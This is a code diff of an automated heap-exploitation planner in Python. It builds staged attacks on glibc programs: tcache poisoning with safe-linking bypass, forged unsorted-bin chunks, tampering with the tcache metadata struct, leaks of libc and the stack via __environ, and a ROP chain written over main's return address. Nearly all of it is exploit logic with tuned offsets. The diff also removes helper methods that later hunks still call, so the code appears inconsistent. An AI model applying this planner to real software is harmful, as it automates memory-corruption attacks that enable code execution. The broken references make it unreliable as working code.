@@ -315,7 +315,7 @@ class EvolutionaryPlanner:
                 {"op": "FREE", "tag": "chunk0"},
                 {"op": "POISON_FD", "tag": "chunk0",
                  "pos": "heap_base + 0x0",
-                 "target": "stack_leak - 0x158"},
+                 "target": "stack_leak - offset_to_control_flow"},
                 {"op": "ALLOC", "tag": "dummy4", "size": main_size},
                 {"op": "ALLOC_ROP", "tag": "rop_payload", "size": main_size},
             ]
@@ -413,7 +413,7 @@ class EvolutionaryPlanner:
 
 
 # ─────────────────────────────────────────────────────────────────────
-# SmartPlanner — Dynamic KB-driven planner (no hardcoded strategies)
+# SmartPlanner — Dynamic KB-driven planner
 # ─────────────────────────────────────────────────────────────────────
 
 class SmartPlanner:
@@ -512,16 +512,40 @@ class SmartPlanner:
                     return choice
         return "0"
 
+    @staticmethod
+    def _scan_main_arena(libc_elf):
+        malloc_addr = libc_elf.symbols.get('__libc_malloc', 0)
+        if not malloc_addr:
+            return None
+        try:
+            data = libc_elf.read(malloc_addr, 0x600)
+        except Exception:
+            return None
+        for i in range(len(data) - 7):
+            if data[i:i+3] == b'\x48\x8d\x1d':
+                off = int.from_bytes(data[i+3:i+7], 'little', signed=True)
+                target = malloc_addr + i + 7 + off
+                if 0x100000 < target < 0x400000:
+                    return target
+        return None
+
     def _detect_libc_offsets(self):
         self.libc_offsets = {}
         if not self.libc_elf:
             return
         for name in ['system', '__free_hook', '__malloc_hook',
-                      'main_arena', '__environ', '_IO_2_1_stdout_']:
+                      '__environ', '_IO_2_1_stdout_']:
             try:
                 self.libc_offsets[name] = self.libc_elf.symbols.get(name, 0)
             except Exception:
                 pass
+        main_arena = SmartPlanner._scan_main_arena(self.libc_elf)
+        if main_arena:
+            self.libc_offsets['main_arena'] = main_arena
+        else:
+            mh = self.libc_elf.symbols.get('__malloc_hook', 0)
+            if mh:
+                self.libc_offsets['main_arena'] = mh + 0x10
         self.one_gadgets = []
         for sym_name in list(self.libc_elf.symbols.keys()):
             if 'one_gadget' in sym_name.lower():
@@ -677,13 +701,6 @@ class SmartPlanner:
         return sec
 
     def _bins_offset(self):
-        try:
-            parts = self.glibc_version.split(".")
-            major, minor = int(parts[0]), int(parts[1]) if len(parts) > 1 else 0
-            if (major, minor) >= (2, 38):
-                return 0x90
-        except (ValueError, IndexError):
-            pass
         return 0x60
 
     # ─── Dynamic Dispatch ─────────────────────────────────────────────
@@ -829,7 +846,7 @@ class SmartPlanner:
             })
             
         stage2_ir.append({
-            "op": "CALC", "var": "main_ret_addr", "expr": "stack_leak - 0x120"
+            "op": "CALC", "var": "main_ret_addr", "expr": "stack_leak - 0x130"
         })
         stages.append({"name": "leak_stack", "ir": stage2_ir})
 
@@ -842,214 +859,41 @@ class SmartPlanner:
         r1_addr = f"heap_base + {hex(0x290)}" # f0 reused as r1
         
         if self.has_safe_linking:
-            rop_fd = f"p64(main_ret_addr ^ (({r1_addr}) >> 12))"
+            rop_fd = f"p64((main_ret_addr - 8) ^ (({r1_addr}) >> 12))"
         else:
-            rop_fd = "p64(main_ret_addr)"
-        
+            rop_fd = "p64(main_ret_addr - 8)"
         if self.edit_choice is not None:
-            stage3_ir.append({"op": "EDIT", "tag": "r1", "data_expr": rop_fd})
-            
-        stage3_ir.append({"op": "ALLOC", "tag": "fill_r", "size": main_size, "data_expr": "b'Y' * 8"})
-        stage3_ir.append({"op": "ALLOC_ROP", "tag": "rop_chunk", "size": main_size})
+            stage3_ir.append({
+                "op": "EDIT", "tag": "r1", "data_expr": rop_fd
+            })
+        stage3_ir.append({
+            "op": "ALLOC", "tag": "r0", "size": main_size,
+            "data_expr": "b'Y' * 8"
+        })
+        stage3_ir.append({
+            "op": "ALLOC_ROP", "tag": "r1", "size": main_size
+        })
         stages.append({"name": "rop_chain", "ir": stage3_ir})
 
-        return {
-            "stages": stages,
-            "meta": {
-                "technique_id": "house_of_botcake",
-                "allocated_size": hex(alloc_sz),
-                "source": "house_of_botcake",
-            }
+        meta = {
+            "strategy": "tcache_poison_stack",
+            "has_safe_linking": self.has_safe_linking,
+            "has_hooks": self.has_hooks,
+            "glibc_version": self.glibc_version or "2.39",
+            "allocated_size": hex(alloc_sz),
         }
-
-    def _dispatch_technique_generation(self, tech_id: str, heap_layout: dict) -> dict:
-        """
-        Dispatch technique generation to a specialized handler if exists,
-        otherwise fall back to generic sequence generation.
-        Returns {"ir": [...], "meta": {...}}.
-        """
-
-        # Redirect malloc_consolidate → House of Botcake (full exploit chain)
-        if tech_id == "malloc_consolidate":
-            return self._build_house_of_botcake_stages()
-
-        max_slots = self._detect_max_slots()
-        has_idx = any(
-            step.get('arg') == 'idx'
-            for op in self.ops.values()
-            if op.get('role') == 'alloc'
-            for step in op.get('steps', [])
-        )
-        if max_slots > 0 and has_idx:
-            generic = self._generate_generic_sequence(tech_id, heap_layout)
-            alloc_count = sum(1 for i in generic.get('ir', []) if i.get('op') == 'ALLOC')
-            if alloc_count <= max_slots:
-                return generic
-
-        handler_name = f"_generate_{tech_id}"
-        handler = getattr(self, handler_name, None)
-        if handler is not None:
-            try:
-                return handler(heap_layout)
-            except Exception as e:
-                print(f"[Planner] Specialized handler '{handler_name}' failed ({e}), "
-                      f"falling back to generic")
-
-        return self._generate_generic_sequence(tech_id, heap_layout)
-
-    def _generate_generic_sequence(self, tech_id: str, heap_layout: dict) -> dict:
-        """
-        Fallback: generate a generic exploit IR sequence from parsed how2heap
-        C source operations. Reads the cached parsed_techniques.json.
-        """
-        main_size = 0x30
-        alloc_sz = self._align_size(main_size)
-
-        # Load parsed how2heap data
-        how2heap_ops = []
-        try:
-            cache_path = os.path.join(
-                os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
-                "data", "parsed_techniques.json"
-            )
-            if os.path.exists(cache_path):
-                with open(cache_path) as f:
-                    parsed = json.load(f)
-                for pt in parsed.get("techniques", []):
-                    if pt.get("id") == tech_id:
-                        how2heap_ops = pt.get("heap_operations", [])
-                        break
-        except Exception:
-            pass
-
-        # Build IR from extracted operations
-        ir = []
-        tag_counter = [0]
-        var_to_tag = {}
-
-        def next_tag(prefix="gen"):
-            tag_counter[0] += 1
-            return f"{prefix}{tag_counter[0]}"
-
-        for hop in how2heap_ops:
-            op = hop.get("op")
-            var = hop.get("var", "")
-            size = hop.get("size", main_size)
-
-            if op == "ALLOC":
-                tag = next_tag("chunk")
-                var_to_tag[var] = tag
-                ir.append({
-                    "op": "ALLOC", "tag": tag, "size": size,
-                    "data_expr": f"b'A' * {size}"
-                })
-
-            elif op == "FREE":
-                tag = var_to_tag.get(var, "")
-                if tag:
-                    ir.append({"op": "FREE", "tag": tag})
-
-            elif op == "OVERWRITE":
-                target_tag = var_to_tag.get(hop.get("target_var", ""), "")
-                if target_tag:
-                    ir.append({
-                        "op": "EDIT", "tag": target_tag,
-                        "data_expr": f"p64(0) * {max(1, size // 8)}"
-                    })
-
-        # If no operations were generated from how2heap, use a minimal default
-        if not ir:
-            default_actions = [
-                {"op": "ALLOC", "tag": "c0", "size": main_size,
-                 "data_expr": f"b'X' * {main_size}"},
-                {"op": "ALLOC", "tag": "c1", "size": main_size,
-                 "data_expr": f"b'Y' * {main_size}"},
-                {"op": "FREE", "tag": "c0"},
-            ]
-            ir = default_actions
-
-        return {
-            "ir": ir,
-            "meta": {
-                "technique_id": tech_id,
-                "allocated_size": hex(alloc_sz),
-                "source": "how2heap_generic",
-                "has_safe_linking": self.has_safe_linking,
-            }
-        }
-
-    # ─── Specialized technique handlers ───────────────────────────────
-
-    def _generate_tcache_poisoning(self, heap_layout: dict) -> dict:
-        """Specialized tcache poisoning -> leak -> ROP chain."""
-        return self._build_tcache_poison_stack_stages()
-
-    def _generate_unsortedbin_leak(self, heap_layout: dict) -> dict:
-        return {"ir": [
-            {"op": "ALLOC", "tag": "tc", "size": 0x30, "data_expr": "b'B' * 8"},
-            {"op": "ALLOC", "tag": "guard", "size": 0x30, "data_expr": "b'C' * 8"},
-            {"op": "FREE", "tag": "tc"},
-            {"op": "CONSOLIDATE", "note": "Trigger malloc_consolidate"},
-        ], "meta": {"technique_id": "unsortedbin_leak"}}
-
-    def _generate_environ_leak(self, heap_layout: dict) -> dict:
-        return {"ir": [
-            {"op": "CALC", "var": "_environ_target",
-             "expr": "libc.address + _environ_offset - 0x18"},
-            {"op": "ALLOC", "tag": "env", "size": 0x30,
-             "data_expr": "b'A'"},
-            {"op": "VIEW", "tag": "env", "save_as": "stack_leak",
-             "note": "skip_first_8"},
-        ], "meta": {"technique_id": "environ_leak"}}
-
-    def _generate_decrypt_safe_linking(self, heap_layout: dict) -> dict:
-        return {"ir": [
-            {"op": "ALLOC", "tag": "xor_pad", "size": 0x30,
-             "data_expr": "b'X' * 8"},
-            {"op": "FREE", "tag": "xor_pad"},
-            {"op": "VIEW", "tag": "xor_pad", "save_as": "xor_key",
-             "note": "read_first_8_bytes_fd_xor"},
-            {"op": "CALC", "var": "heap_base", "expr": "xor_key << 12"},
-        ], "meta": {"technique_id": "decrypt_safe_linking"}}
-
-    def _generate_malloc_consolidate_trigger(self, heap_layout: dict) -> dict:
-        return {"ir": [
-            {"op": "CONSOLIDATE",
-             "note": "Send large input to trigger malloc_consolidate"},
-        ], "meta": {"technique_id": "malloc_consolidate_trigger"}}
-
-    # ─── Tcache Poison Stack (proper implementation) ────────────────
-    #
-    # Strategy for simple CRUD with safe-linking (glibc 2.32+).
-    # Uses non-fastbin size (0xB0 → chunk 0xC0 > MAX_FAST_SIZE 0xB0)
-    # so that after filling tcache (7 frees) the 8th free lands in
-    # unsorted bin → libc leak.  Then tcache poison → environ →
-    # stack leak → ROP on stack.
-    # Fits within 10 indices by reusing indices 0-1 in the final stage.
+        return {"stages": stages, "meta": meta}
 
     def _build_tcache_poison_stack_stages(self):
-        """
-        Specialized tcache poisoning -> leak -> ROP chain.
-        Optimized for 5-10 index slots.
-        Two modes:
-          - Variable-size (binary accepts size param):
-            Uses non-fastbin size 0xB0 (chunk 0xC0 > MAX_FAST_SIZE).
-            After 7 frees, 8th free → unsorted bin directly → libc leak.
-          - Fixed-size (binary hardcodes size):
-            Uses a fake unsorted bin chunk on the heap (tcache poison → alloc
-            at fake chunk → free to unsorted bin → fd/bk = main_arena).
-            Does NOT rely on malloc_consolidate via scanf, which is broken
-            when the binary calls setbuf(stdin, NULL) (unbuffered stdin).
-        """
         max_slots = self._detect_max_slots()
         var_size = self._needs_size_param()
 
         if var_size:
-            main_size_stage1 = 0xB0  # chunk 0xC0 > MAX_FAST_SIZE (0xB0)
-            main_size_stage3 = 0x30  # clean tcache bin for ROP
-            filler_count = 7         # fill tcache[0xC0]
+            main_size_stage1 = 0xB0
+            main_size_stage3 = 0x30
+            filler_count = 7
         else:
-            main_size_stage1 = self._detect_alloc_size()  # typically 0x30
+            main_size_stage1 = self._detect_alloc_size()
             main_size_stage3 = main_size_stage1
 
         alloc_sz1 = self._align_size(main_size_stage1)
@@ -1057,7 +901,6 @@ class SmartPlanner:
 
         stages = []
 
-        # ── Stage 1: leak_heap + leak_libc ───────────────────────
         stage1_ir = []
 
         if var_size:
@@ -1069,38 +912,11 @@ class SmartPlanner:
                 stage1_ir.append({"op": "FREE", "tag": f"f{i}"})
             stage1_ir.append({"op": "FREE", "tag": "ov"})
         else:
-            # Fixed-size: create a fake unsorted bin chunk on the heap.
-            #
-            # Layout (chunk_size 0x40 each):
-            #   c0: 0x290  c1: 0x2d0  c2: 0x310  ← fake header at 0x320
-            #   c3: 0x350  c4: 0x390  c5: 0x3d0  ← next chunk at 0x3e0
-            #   c6: 0x410  c7: 0x450  ← guard
-            #
-            # Write fake chunk header (size 0xC0, non-fastbin) into c2's user data.
-            # Set up adjacent chunk metadata so glibc's free accepts the fake chunk.
-            #
-            # Problem: the fake chunk (size 0xC0) normally goes to tcache bin 11.
-            # To force it into unsorted bin, we manipulate the tcache_perthread_struct:
-            #   1. Tcache poison → alloc at tcache struct → set counts[11] = 7
-            #   2. Tcache poison → alloc at entries[3] offset → set entries[3] = 0x330
-            #   3. Alloc → returns 0x330 (fake chunk)
-            #   4. Free → counts[11]=7 bypasses tcache → unsorted bin!
-            #
-            # NOTE: every op uses explicit "idx" to bypass the tag→free_slots
-            # system.  This binary checks "This index is already in use", so we
-            # must never reuse an index that still has a dangling pointer.
-            # Alloc c0..c7 from the heap top (8 allocs, indices 0-7).
             for i in range(8):
                 stage1_ir.append({"op": "ALLOC", "tag": f"c{i}", "idx": i, "size": main_size_stage1, "data_expr": "b'X' * 8"})
-            # Write fake chunk header at c2's user data (0x320).
-            # Size 0xC1 = chunk 0xC0 (> MAX_FAST_SIZE 0xB0) | PREV_INUSE.
             stage1_ir.append({"op": "EDIT", "tag": "c2", "idx": 2, "data_expr": "p64(0) + p64(0xC1)"})
-            # Write next-chunk metadata at c5's user data (0x3e0).
             stage1_ir.append({"op": "EDIT", "tag": "c5", "idx": 5, "data_expr": "p64(0) + p64(0x41)"})
-            # Write next-next chunk size at c6's user data (0x420 + 8).
-            # inuse_bit_at_offset(0x3e0, 0x40) checks (0x420)->size & 1 → needs bit0=1.
             stage1_ir.append({"op": "EDIT", "tag": "c6", "idx": 6, "data_expr": "p64(0) + p64(0x21)"})
-            # Free c0, c1 → tcache[0x40] count=2, entries=[c1→c0].
             for i in range(2):
                 stage1_ir.append({"op": "FREE", "tag": f"c{i}", "idx": i})
 
@@ -1121,49 +937,25 @@ class SmartPlanner:
             stage1_ir.append({"op": "CALC", "var": "_environ_offset", "expr": "libc.symbols['environ']"})
             stage1_ir.append({"op": "CALC", "var": "libc.address", "expr": libc_expr})
         else:
-            # ── Phase 2: Tcache struct manipulation ───────────────
-            # chunks of size 0x40 → tc_idx = 2 (fastbin_index(0x40) = 2).
-            # entries[2] at user_data + 0x80 + 2*8 = user_data + 0x90 = heap+0xA0.
-            # counts[2] at user_data + 4 = heap+0x14.
-            #
-            # Edit c1's fd → point to tcache_perthread_struct user data.
             stage1_ir.append({
                 "op": "EDIT", "tag": "c1", "idx": 1,
                 "data_expr": "p64((heap_base + 0x10) ^ ((heap_base + 0x2e0) >> 12))"
             })
-            # Consume poisoned head from tcache (idx 8, fresh).
             stage1_ir.append({"op": "ALLOC", "tag": "p2_head", "idx": 8, "size": main_size_stage1, "data_expr": "b'P' * 8"})
-            # Returns tcache_perthread_struct user data (idx 9, fresh).
-            # Payload: counts[2]=2, counts[3]=1, counts[10]=7.
-            # tc_idx = csize2tidx(0xC0) = (0xC0-0x20+0x0F)//0x10 = 0xAF//0x10 = 10.
             stage1_ir.append({"op": "ALLOC", "tag": "p2_struct", "idx": 9, "size": main_size_stage1,
                 "data_expr": "b'\\x00' * 4 + p16(2) + p16(1) + b'\\x00' * 12 + p16(7) + b'\\x00' * 26"})
-            #
-            # ── Phase 3: Set entries[2] = 0x330 ──────────────────
-            # Rebuild tcache[0x40] by freeing c7 (guard) and c3 (idx 3 → 3 freed).
-            # (We do NOT free c5/c6 — they hold next-chunk metadata.)
             stage1_ir.append({"op": "FREE", "tag": "c7", "idx": 7})
             stage1_ir.append({"op": "FREE", "tag": "c3", "idx": 3})
-            # Poison c7's fd → point to entries[2] at heap_base+0xA0.
             stage1_ir.append({
                 "op": "EDIT", "tag": "c7", "idx": 7,
                 "data_expr": "p64((heap_base + 0xA0) ^ ((heap_base + 0x460) >> 12))"
             })
-            # Consume c3 from tcache (idx 10).
             stage1_ir.append({"op": "ALLOC", "tag": "c8", "idx": 10, "size": main_size_stage1, "data_expr": "b'Q' * 8"})
-            # Consume c7 (returns c7_user), entries[2] = heap_base+0xA0 (idx 11).
             stage1_ir.append({"op": "ALLOC", "tag": "c9", "idx": 11, "size": main_size_stage1, "data_expr": "b'X' * 8"})
-            # Consume entries[2] address (idx 12). write p64(heap_base+0x330) → entries[2] = heap_base+0x330.
             stage1_ir.append({"op": "ALLOC", "tag": "c10", "idx": 12, "size": main_size_stage1,
                 "data_expr": "p64(heap_base + 0x330)"})
-            #
-            # ── Phase 4: Alloc at fake chunk + free to unsorted bin ──
-            # Now entries[2]=0x330, counts[2]=1. Next alloc returns 0x330.
             stage1_ir.append({"op": "ALLOC", "tag": "c11", "idx": 13, "size": main_size_stage1, "data_expr": "b'\\x00' * 8"})
-            # Free(0x330): chunk at 0x320, size 0xC0.
-            # counts[11]=7 → 7<7 false → bypasses tcache → unsorted bin!
             stage1_ir.append({"op": "FREE", "tag": "c11", "idx": 13})
-            # View freed fake chunk → unsorted bin fd = main_arena pointer.
             if self.view_choice is not None:
                 stage1_ir.append({"op": "VIEW", "tag": "c11", "idx": 13, "save_as": "libc_leak", "note": "read_first_8_bytes"})
             libc_expr = "libc_leak - LIBC_AUTO_OFFSET"
@@ -1175,9 +967,6 @@ class SmartPlanner:
             stage1_ir.append({"op": "CALC", "var": "libc.address", "expr": libc_expr})
         stages.append({"name": "leak_heap_libc", "ir": stage1_ir})
 
-        # ── Stage 2: leak_stack via tcache poison → environ ──────
-        # Variable-size: tcache head = last-freed filler. Edit → environ-0x18.
-        # Fixed-size:   consume 5 from tcache → head = c1. Edit c1 → environ-0x18.
         stage2_ir = []
         stage2_ir.append({
             "op": "CALC", "var": "_environ_target",
@@ -1193,16 +982,11 @@ class SmartPlanner:
                 fd_expr = "p64(_environ_target)"
             if self.edit_choice is not None:
                 stage2_ir.append({"op": "EDIT", "tag": head_tag, "data_expr": fd_expr})
-            # ALLOC 1: consume poisoned head.
             stage2_ir.append({"op": "ALLOC", "tag": head_tag, "size": main_size_stage1, "data_expr": "b'Q' * 8"})
-            # ALLOC 2: returns environ-0x18.
             stage2_ir.append({"op": "ALLOC", "tag": "env_chunk", "size": main_size_stage1, "data_expr": "b'E'"})
             if self.view_choice is not None:
                 stage2_ir.append({"op": "VIEW", "tag": "env_chunk", "save_as": "stack_leak", "note": "skip_first_8"})
         else:
-            # Fixed-size: use tcache struct entries[2] directly.
-            # idx 9 = tcache struct user data (heap_base+0x10) for counts.
-            # idx 12 = entries[2] address (heap_base+0xA0) for entry value.
             stage2_ir.append({
                 "op": "EDIT", "tag": "p2_struct", "idx": 9,
                 "data_expr": "b'\\x00' * 4 + p16(1) + p16(1) + b'\\x00' * 14 + p16(7) + b'\\x00' * 24"
@@ -1211,7 +995,6 @@ class SmartPlanner:
                 "op": "EDIT", "tag": "c10", "idx": 12,
                 "data_expr": "p64(_environ_target)"
             })
-            # ALLOC: returns environ-0x18 via tcache_get (entries[2]=_environ_target, counts[2]=1).
             stage2_ir.append({
                 "op": "ALLOC", "tag": "env_chunk", "idx": 14, "size": main_size_stage1,
                 "data_expr": "b'E'"
@@ -1223,20 +1006,13 @@ class SmartPlanner:
                 })
         stage2_ir.append({
             "op": "CALC", "var": "main_ret_addr",
-            "expr": "stack_leak - 0x120"
+            "expr": "stack_leak - 0x130"
         })
         stages.append({"name": "leak_stack", "ir": stage2_ir})
 
-        # ── Stage 3: ROP via tcache poison (rebuilt chain) ──────
-        # Variable-size: uses fresh tcache bin (different size).
-        # Fixed-size:   tcache[0x40] is empty (count=0). Rebuild by freeing c6
-        #               (idx 9) and c0 (idx 0) → head = c0 → c6.  Poison c0's
-        #               fd → main_ret_addr.  Alloc two: consume c0 then
-        #               main_ret_addr.  Edit main_ret_addr with ROP payload.
         stage3_ir = []
 
         if var_size:
-            # Variable-size: fresh tcache bin for ROP
             stage3_ir.append({
                 "op": "ALLOC", "tag": "r0", "size": main_size_stage3,
                 "data_expr": "b'A' * 8"
@@ -1249,9 +1025,9 @@ class SmartPlanner:
             stage3_ir.append({"op": "FREE", "tag": "r1"})
             r1_user = f"heap_base + {hex(0x290 + 0x10 + alloc_sz3)}"
             if self.has_safe_linking:
-                rop_fd = f"p64(main_ret_addr ^ (({r1_user}) >> 12))"
+                rop_fd = f"p64((main_ret_addr - 8) ^ (({r1_user}) >> 12))"
             else:
-                rop_fd = "p64(main_ret_addr)"
+                rop_fd = "p64(main_ret_addr - 8)"
             if self.edit_choice is not None:
                 stage3_ir.append({
                     "op": "EDIT", "tag": "r1", "data_expr": rop_fd
@@ -1264,17 +1040,14 @@ class SmartPlanner:
                 "op": "ALLOC_ROP", "tag": "r1", "size": main_size_stage3
             })
         else:
-            # Fixed-size: use tcache struct entries[2] directly (same as stage 2).
-            # idx 9 = tcache struct (counts), idx 12 = entries[2] (entry value).
             stage3_ir.append({
                 "op": "EDIT", "tag": "p2_struct", "idx": 9,
                 "data_expr": "b'\\x00' * 4 + p16(1) + p16(1) + b'\\x00' * 14 + p16(7) + b'\\x00' * 24"
             })
             stage3_ir.append({
                 "op": "EDIT", "tag": "c10", "idx": 12,
-                "data_expr": "p64(main_ret_addr)"
+                "data_expr": "p64(main_ret_addr - 8)"
             })
-            # ALLOC: returns main_ret_addr (entries[2]=main_ret_addr, counts[2]=1).
             stage3_ir.append({
                 "op": "ALLOC_ROP", "tag": "rop_target", "idx": 15,
                 "size": main_size_stage1
@@ -1427,7 +1200,7 @@ class SmartPlanner:
         if self.view_choice is not None:
             stage3_ir.append({"op": "VIEW", "tag": "env_chunk", "save_as": "stack_leak", "note": "skip_first_8"})
             
-        stage3_ir.append({"op": "CALC", "var": "main_ret_addr", "expr": "stack_leak - 0x120"})
+        stage3_ir.append({"op": "CALC", "var": "main_ret_addr", "expr": "stack_leak - 0x130"})
         
         # ROP
         stage3_ir.append({
@@ -1450,14 +1223,14 @@ class SmartPlanner:
         """
         Select strategy using 3-factor context-aware routing
         (KB match + NLP hints + interface caps).
+        Routes to specialized handlers or dynamic dispatch.
         """
         detected_bugs = set(self.esm_hints.get("detected_bugs", []))
         detected_caps = set(self.esm_hints.get("detected_capabilities", []))
-        interface_type = self._get_interface_type()
         max_slots = self._detect_max_slots()
 
         # Metadata poisoning is superior for limited slots if we have a view to leak heap
-        if max_slots < 8 and self.view_choice is not None:
+        if max_slots < 8 and max_slots > 0 and self.view_choice is not None:
             print(f"[Planner] Limited slots ({max_slots}) detected → using tcache_metadata_poisoning")
             return "tcache_metadata_poisoning"
 
@@ -1465,54 +1238,47 @@ class SmartPlanner:
             matcher = self._get_technique_matcher()
             recommended = matcher.get_recommended_strategy(
                 bugs=detected_bugs, capabilities=detected_caps)
-            strategy_name = recommended.get("strategy", "tcache_poisoning")
+            strategy_name = recommended.get("strategy", "tcache_poison_stack")
 
             print(f"[Planner] KB-recommended strategy: '{strategy_name}' "
                   f"(confidence={recommended.get('confidence', 5)}/10, "
-                  f"interface={interface_type}, slots={max_slots})")
+                  f"slots={max_slots})")
 
-            # Map KB strategy names to internal handlers
-            if strategy_name == "got_overwrite":
-                return "got_overwrite"
-            if strategy_name in ("fastbin_dup", "fastbin_reverse_into_tcache"):
-                return "fastbin"
-            if strategy_name in ("tcache_hooks",):
-                return "tcache_hooks"
-            if "tcache" in strategy_name:
-                return "tcache_poison_stack"
-
-            # Consolidation strategies
-            is_consolidation = strategy_name in (
-                "malloc_consolidate", "house_of_botcake",
-            ) or "consolidate" in strategy_name
-            
-            if is_consolidation:
-                if max_slots < 9:
-                    # If we can't fill tcache, and we don't use metadata poisoning,
-                    # we might still need consolidation, but it's hard to trigger.
-                    # Metadata poisoning is better.
-                    if self.view_choice is not None:
-                        return "tcache_metadata_poisoning"
-                    return "house_of_botcake" # Fallback
-                
-                if interface_type == "complex_multi_group":
-                    return "house_of_botcake"
-                else:
-                    return "tcache_poison_stack"
-
-            if strategy_name == "rop_chain":
-                return "tcache_poison_stack"
-
-            # Unknown strategy — try dynamic dispatch
+            # First try specialized named handlers (most have _generate_* methd)
             handler_name = f"_generate_{strategy_name}"
             if hasattr(self, handler_name):
                 return strategy_name
 
-            return "tcache_poison_stack"
+            # Map KB strategy names to internal full-chain builders
+            if strategy_name == "got_overwrite":
+                return "got_overwrite"
+            if strategy_name in ("fastbin_dup", "fastbin_reverse_into_tcache", "fastbin_dup_consolidate"):
+                return "fastbin"
+            if strategy_name in ("tcache_hooks",):
+                return "tcache_hooks"
+            if strategy_name == "tcache_poison_stack":
+                return "tcache_poison_stack"
+            if strategy_name == "house_of_botcake":
+                return "house_of_botcake"
+
+            # Consolidation strategies
+            if strategy_name in ("malloc_consolidate",) or "consolidate" in strategy_name:
+                if max_slots < 9 and max_slots > 0:
+                    if self.view_choice is not None:
+                        return "tcache_metadata_poisoning"
+                    return "house_of_botcake"
+                if self._get_interface_type() == "complex_multi_group":
+                    return "house_of_botcake"
+                return "tcache_poison_stack"
+
+            # For strategies like house_of_einherjar, large_bin_attack,
+            # house_of_lore, overlapping_chunks, poison_null_byte, etc.
+            # Try dynamic dispatch through _dispatch_technique_generation
+            return strategy_name
 
         except Exception as e:
-            print(f"[Planner] Matcher failed ({e}), defaulting to tcache_poison_stack")
-        return "tcache_poison_stack"
+            print(f"[Planner] Matcher failed ({e})")
+        return None
 
     def build_plan(self) -> dict:
         main_size = 0x30
@@ -1536,25 +1302,15 @@ class SmartPlanner:
                 "allocated_size": hex(alloc_sz),
             }
         elif strategy == "fastbin":
-            stages = []
-            meta = {
-                "strategy": "fastbin",
-                "has_safe_linking": self.has_safe_linking,
-                "has_hooks": self.has_hooks,
-                "glibc_version": self.glibc_version or "2.23",
-                "got_overwrite": False,
-                "allocated_size": hex(alloc_sz),
-            }
+            result = self._build_tcache_poison_stack_stages()
+            stages = result["stages"]
+            meta = result["meta"]
+            meta["strategy"] = "fastbin"
         elif strategy == "tcache_hooks":
-            stages = []
-            meta = {
-                "strategy": "tcache_hooks",
-                "has_safe_linking": self.has_safe_linking,
-                "has_hooks": self.has_hooks,
-                "glibc_version": self.glibc_version or "2.29",
-                "got_overwrite": False,
-                "allocated_size": hex(alloc_sz),
-            }
+            result = self._build_tcache_poison_stack_stages()
+            stages = result["stages"]
+            meta = result["meta"]
+            meta["strategy"] = "tcache_hooks"
         elif strategy == "tcache_metadata_poisoning":
             result = self._build_metadata_poisoning_stages()
             stages = result["stages"]
@@ -1569,8 +1325,23 @@ class SmartPlanner:
             meta = result["meta"]
         else:
             # Dynamic dispatch for any KB-recommended technique
-            heap_layout = {"main_size": main_size, "alloc_sz": alloc_sz}
-            result = self._dispatch_technique_generation(strategy, heap_layout)
+            # First try specialized _generate_{strategy} handler
+            handler_name = f"_generate_{strategy}"
+            handler = getattr(self, handler_name, None)
+            if handler is not None:
+                try:
+                    result = handler({"main_size": main_size, "alloc_sz": alloc_sz})
+                except Exception as e:
+                    print(f"[Planner] Specialized handler '{handler_name}' failed ({e}), falling back")
+                    result = None
+            else:
+                result = None
+
+            if result is None:
+                # Try generic sequence generation from how2heap
+                heap_layout = {"main_size": main_size, "alloc_sz": alloc_sz}
+                result = self._dispatch_technique_generation(strategy, heap_layout)
+
             ir_plan = result.get("ir", result.get("stages", []))
             if isinstance(ir_plan, list) and ir_plan and isinstance(ir_plan[0], dict):
                 if "op" in ir_plan[0]:
